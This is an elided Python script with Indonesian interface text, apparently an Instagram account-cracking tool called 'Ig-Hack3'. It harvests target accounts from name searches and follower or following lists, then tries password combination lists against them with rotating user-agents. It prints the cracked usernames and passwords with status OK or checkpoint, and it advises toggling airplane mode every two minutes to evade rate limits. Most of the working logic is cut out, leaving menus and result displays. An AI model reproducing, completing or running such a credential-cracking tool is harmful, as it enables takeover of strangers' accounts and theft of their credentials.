...
def login():
	...
	try:
		...
		exit(f'[{O}!{C}] KeyboardInterrupt Terdeteksi... Keluar {M}!{C}')
	...
	if x.get('status')=='success':
		...
		exit(f'[{O}!{C}] Login Checkpoint')
	else:
		exit(f'[{O}!{C}] Username Atau Password Yang Anda Masukan Salah')
...
class instagram:
	...
	def logo(self):
		...
		print(f"""
{M}╭─{C}╭──────────────────────────────────────╮
{M}│ {C}│[{K}1{C}] Crack Dari Pencarian Nama        {M}│{C}│
{M}│ {C}│[{K}2{C}] Crack Dari Pengikuti             {M}│{C}│
{M}│ {C}│[{K}3{C}] Crack Dari Mengikuti             {M}│{C}│
{M}│ {C}│[{K}4{C}] Crack Ulang Hasil Crack          {M}│{C}│
{O}│ {C}│[{K}5{C}] Cek Akun Hasil Crack             {O}│{C}│
{O}│ {C}│                                     {O}│{C}│
{O}│ {C}│[{M}P{C}] {M}Keluar{C}                           {O}│{C}│
{O}╰─{C}╰──────────────────────────────────────╯
	""")

	def Exit(self):
		x=input(f'\n [{K}?{C}] Apakah Anda Yakin Ingin Keluar ? [Y/t] : ')
		if x in ('y','Y'):
			os.remove('.kukis.log')
			os.remove('.username')
			os.system('python3 Ig-Hack3.py')
	...
	def searchAPI(self,cookie,nama):
		try:
			...
			exit(f'\n [{O}!{C}] Koneksi Internet Bermasalah')
		return internal
	...
	def idAPI(self,cookie,id):
		try:
			...
			exit(f"\n [{O}!{C}] Username Yang Anda Masukan Tidak Di Temukan Pastikan Target Bersifat Publik")
		return idx
	...
	def infoAPI(self,cookie,api,id):
		try:
			...
			print(f'\n [{O}!{C}] Username Yang Anda Masukan Tidak Di Temukan')
		return internal
	...
	def passwordAPI(self,xnx):
		...
		print(f"""
{M}╭{C}╭──────────────────────────────────────╮
{M}│{C}│[ {B}List Kombinasi Password Instagram {C}]{M}│{C}│
{M}│{C}│                                     {M}│{C}│
{M}│{C}│[{K}1{C}] Password V1 [ {H}Cepat {C}]            {M}│{C}│
{O}│{C}│[{K}2{C}] Password V2 [ {H}Agak Lambat {C}]      {O}│{C}│
{O}│{C}│[{K}3{C}] Password V3 [ {H}Lambat {C}]           {O}│{C}│
{O}╰{C}╰──────────────────────────────────────╯
		""")
	...
	def generateAPI(self,user,o):
		print(f"""
{M}╭{C}╭──────────────────────────────────────╮
{M}│{C}│[ {B}List User-Agent {C}]                  {M}│{C}│
{M}│{C}│                                     {M}│{C}│
{M}│{C}│[{K}1{C}] User-Agent V1                    {M}│{C}│
{O}│{C}│[{K}2{C}] User-Agent V2                    {O}│{C}│
{O}│{C}│[{K}3{C}] User-Agent V3                    {O}│{C}│
{O}╰{C}╰──────────────────────────────────────╯
		""")
 ...
 [{M}!{C}] Hidupkan Mode Pesawat Setiap 2 Menit
	...
	def crackAPI(self,user,pas,uaAPI):
		...
		sys.stdout.write(f"\r [CRACK][{M}{loop}/{len(internal)}{C}][{H}OK{C}]:{len(success)}][{K}CP{C}]:{len(checkpoint)}]{C} "),
		sys.stdout.flush()
		try:
			for pw in pas:
  ...
  {C}[{H}√{C}] STATUS    : {H}OK
  {C}[{O}•{C}] Nama      : {H}{nama}{C}
  {C}[{O}•{C}] Username  : {H}{user}{C}
  {C}[{O}•{C}] Password  : {H}{pw}{C}
  {C}[{O}•{C}] Pengikut  : {H}{pengikut}{C}
  {C}[{O}•{C}] Mengikuti : {H}{mengikut}{C}
  {C}[{O}•{C}] Postingan : {H}{postingan}{C}
					""")
  ...
  {C}[{M}X{C}] STATUS    : {K}CP
  {C}[{O}•{C}] Nama      : {K}{nama}{C}
  {C}[{O}•{C}] Username  : {K}{user}{C}
  {C}[{O}•{C}] Password  : {K}{pw}{C}
  {C}[{O}•{C}] Pengikut  : {K}{pengikut}{C}
  {C}[{O}•{C}] Mengikuti : {K}{mengikut}{C}
  {C}[{O}•{C}] Postingan : {K}{postingan}{C}
					""")
					...
					sys.stdout.write(f"\r [{O}!{C}] Please Wait A Few Minutes Second");sys.stdout.flush();sleep(10)
  ...
  {C}[{O}•{C}] Postingan : {K}{postingan}{C}
	...
	def menu(self):
		...
		if c=='':
			...
			m=int(input(f'\n [{K}?{C}] Masukan Jumlah Target : '));print('')
			for i in range(m):
				i+1
				nama=input(f' [{B}>{C}] Masukan nama pencarian ({H}{len(internal)}{C}) : ')
				name=self.searchAPI(self.cookie,nama)
			self.passwordAPI(name)

		elif c in ('2','02'):
			print(f'\n [{O}!{C}] Target Harus Bersifat Publik Jangan Privat')
			...
			print(f'\n [{H}+{C}] Total Result {H}{len(g)}{C}')
			print(f'\n [{O}!{C}] Proses Mengecek Status Akun.Silahkan Tunggu Sebentar\n')
			for s in g:
				usr=s.split("|")[0]
				pwd=s.split("|")[1]
				self.checkAPI(usr,pwd)
			exit(f'\n\n [{B}#{C}] Proses Check Selesai...')
			...
			for s in g:
				...
				if xc=="checkpoint":
					print(f"""
  {C}[{M}X{C}] STATUS    : {K}CP{C}
  {C}[{O}•{C}] Username  : {K}{usr}{C}
  {C}[{O}•{C}] Password  : {K}{pwd}{C}
  {C}[{O}•{C}] Pengikut  : {K}{fol}{C}
  {C}[{O}•{C}] Mengikuti : {K}{ful}{C}
					""");sleep(0.05)
				else:
					print(f"""
  {C}[{H}√{C}] STATUS    : {H}OK{C}
  {C}[{O}•{C}] Username  : {H}{usr}{C}
  {C}[{O}•{C}] Password  : {H}{pwd}{C}
  {C}[{O}•{C}] Pengikut  : {H}{fol}{C}
  {C}[{O}•{C}] Mengikuti : {H}{ful}{C}
					""");sleep(0.05)
